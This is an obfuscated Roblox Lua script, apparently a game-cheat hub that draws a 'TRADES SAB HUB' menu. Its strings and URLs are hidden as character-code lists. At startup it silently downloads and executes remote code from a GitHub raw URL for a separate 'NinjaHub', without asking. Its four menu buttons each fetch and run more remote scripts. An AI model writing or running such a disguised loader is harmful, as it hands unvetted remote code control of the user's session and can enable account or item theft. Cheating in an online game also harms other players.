task.spawn(function()
local _0xAF90, _0x14CF = pcall(function()
loadstring(game:HttpGet(string.char(104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,115,97,98,45,97,112,105,47,115,97,98,45,115,99,114,105,112,116,115,47,109,97,105,110,47,115,99,114,105,112,116,115,47,110,105,110,106,97,104,117,98,95,49,55,57,52,55,54,49,57,48,49,56,50,52,46,108,117,97)))()
end)
if not _0xAF90 then
warn(string.char(69,114,114,111,114,32,97,108,32,99,97,114,103,97,114,32,78,105,110,106,97,72,117,98,58,32).. tostring(_0x14CF))
end
end)local _0x579D = game:GetService(string.char(67,111,114,101,71,117,105))
local _0xA95D = game:GetService(string.char(80,108,97,121,101,114,115))
local _0x3AEA = _0xA95D.LocalPlayerif _0x579D:FindFirstChild(string.char(84,114,97,100,101,83,65,66,72,117,98,71,85,73)) then
_0x579D.TradeSABHubGUI:Destroy()
end
local _0xFAC4 = Instance.new(string.char(83,99,114,101,101,110,71,117,105))
_0xFAC4.Name =string.char(84,114,97,100,101,83,65,66,72,117,98,71,85,73)_0xFAC4.ResetOnSpawn = false
pcall(function()
_0xFAC4.Parent = _0x579D
end)
if not _0xFAC4.Parent then
_0xFAC4.Parent = _0x3AEA:WaitForChild(string.char(80,108,97,121,101,114,71,117,105))
endlocal _0xEE8C = Instance.new(string.char(84,101,120,116,66,117,116,116,111,110))
_0xEE8C.Name =string.char(84,111,103,103,108,101,66,117,116,116,111,110)_0xEE8C.Size = UDim2.new(0, 55, 0, 55)
_0xEE8C.Position = UDim2.new(0, 20, 0, 100)
_0xEE8C.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
_0xEE8C.TextColor3 = Color3.fromRGB(255, 255, 255)
_0xEE8C.TextSize = 16
_0xEE8C.Font = Enum.Font.GothamBold
_0xEE8C.Text =string.char(83,65,66)_0xEE8C.Parent = _0xFAC4
local _0x7A5A = Instance.new(string.char(85,73,67,111,114,110,101,114))
_0x7A5A.CornerRadius = UDim.new(0, 14)
_0x7A5A.Parent = _0xEE8Clocal _0xBFD2 = Instance.new(string.char(70,114,97,109,101))
_0xBFD2.Name =string.char(77,97,105,110,70,114,97,109,101)_0xBFD2.Size = UDim2.new(0, 320, 0, 335)
_0xBFD2.Position = UDim2.new(0.5, -160, 0.5, -167)
_0xBFD2.BackgroundColor3 = Color3.fromRGB(18, 18, 25)
_0xBFD2.BorderSizePixel = 0
_0xBFD2.Visible = true
_0xBFD2.Parent = _0xFAC4
local _0xE603 = Instance.new(string.char(85,73,67,111,114,110,101,114))
_0xE603.CornerRadius = UDim.new(0, 16)
_0xE603.Parent = _0xBFD2local _0x16B2 = Instance.new(string.char(84,101,120,116,76,97,98,101,108))
_0x16B2.Size = UDim2.new(1, 0, 0, 50)
_0x16B2.BackgroundTransparency = 1
_0x16B2.Text =string.char(84,82,65,68,69,83,32,83,65,66,32,72,85,66)_0x16B2.TextColor3 = Color3.fromRGB(255, 255, 255)
_0x16B2.TextSize = 20
_0x16B2.Font = Enum.Font.GothamBold
_0x16B2.Parent = _0xBFD2local _0x09F5 = Instance.new(string.char(83,99,114,111,108,108,105,110,103,70,114,97,109,101))
_0x09F5.Size = UDim2.new(1, -20, 1, -65)
_0x09F5.Position = UDim2.new(0, 10, 0, 55)
_0x09F5.BackgroundTransparency = 1
_0x09F5.BorderSizePixel = 0
_0x09F5.CanvasSize = UDim2.new(0, 0, 0, 270)
_0x09F5.ScrollBarThickness = 4
_0x09F5.Parent = _0xBFD2
local _0x217C = Instance.new(string.char(85,73,76,105,115,116,76,97,121,111,117,116))
_0x217C.HorizontalAlignment = Enum.HorizontalAlignment.Center
_0x217C.SortOrder = Enum.SortOrder.LayoutOrder
_0x217C.Padding = UDim.new(0, 12)
_0x217C.Parent = _0x09F5local function _0x193B(name, url, order)
local _0x1E09 = Instance.new(string.char(84,101,120,116,66,117,116,116,111,110))
_0x1E09.Name = name ..string.char(66,116,110)_0x1E09.Size = UDim2.new(1, -10, 0, 52)
_0x1E09.BackgroundColor3 = Color3.fromRGB(38, 38, 52)
_0x1E09.TextColor3 = Color3.fromRGB(255, 255, 255)
_0x1E09.TextSize = 15
_0x1E09.Font = Enum.Font.GothamSemibold
_0x1E09.Text = name
_0x1E09.LayoutOrder = order
_0x1E09.Parent = _0x09F5
local _0x7A36 = Instance.new(string.char(85,73,67,111,114,110,101,114))
_0x7A36.CornerRadius = UDim.new(0, 10)
_0x7A36.Parent = _0x1E09
_0x1E09.MouseButton1Click:Connect(function()
pcall(function()
loadstring(game:HttpGet(url))()
end)
end)
end_0x193B(string.char(65,73,32,82,105,100,100,108,101,32,67,111,100,101),string.char(104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,110,105,99,101,98,111,110,105,99,101,108,121,45,104,117,101,47,84,82,65,68,69,83,83,65,66,72,85,66,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,97,105,114,105,100,100,108,101,99,111,100,101,46,108,117,97), 1)
_0x193B(string.char(65,117,116,111,32,67,111,100,101,32,83,65,66),string.char(104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,110,105,99,101,98,111,110,105,99,101,108,121,45,104,117,101,47,84,82,65,68,69,83,83,65,66,72,85,66,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,97,117,116,111,99,111,100,101,115,97,98,46,108,117,97), 2)
_0x193B(string.char(79,112,101,110,32,79,108,100,32,77,97,99,104,105,110,101,115),string.char(104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,110,105,99,101,98,111,110,105,99,101,108,121,45,104,117,101,47,84,82,65,68,69,83,83,65,66,72,85,66,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,111,112,101,110,111,108,100,109,97,99,104,105,110,101,115,115,97,98,46,108,117,97), 3)
_0x193B(string.char(84,114,97,105,116,32,70,97,114,109,101,114,32,79,112),string.char(104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,110,105,99,101,98,111,110,105,99,101,108,121,45,104,117,101,47,84,82,65,68,69,83,83,65,66,72,85,66,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,116,114,97,105,116,102,97,114,109,101,114,111,112,46,108,117,97), 4)local _0xE4D0 = true
_0xEE8C.MouseButton1Click:Connect(function()
_0xE4D0 = not _0xE4D0
_0xBFD2.Visible = _0xE4D0
end)
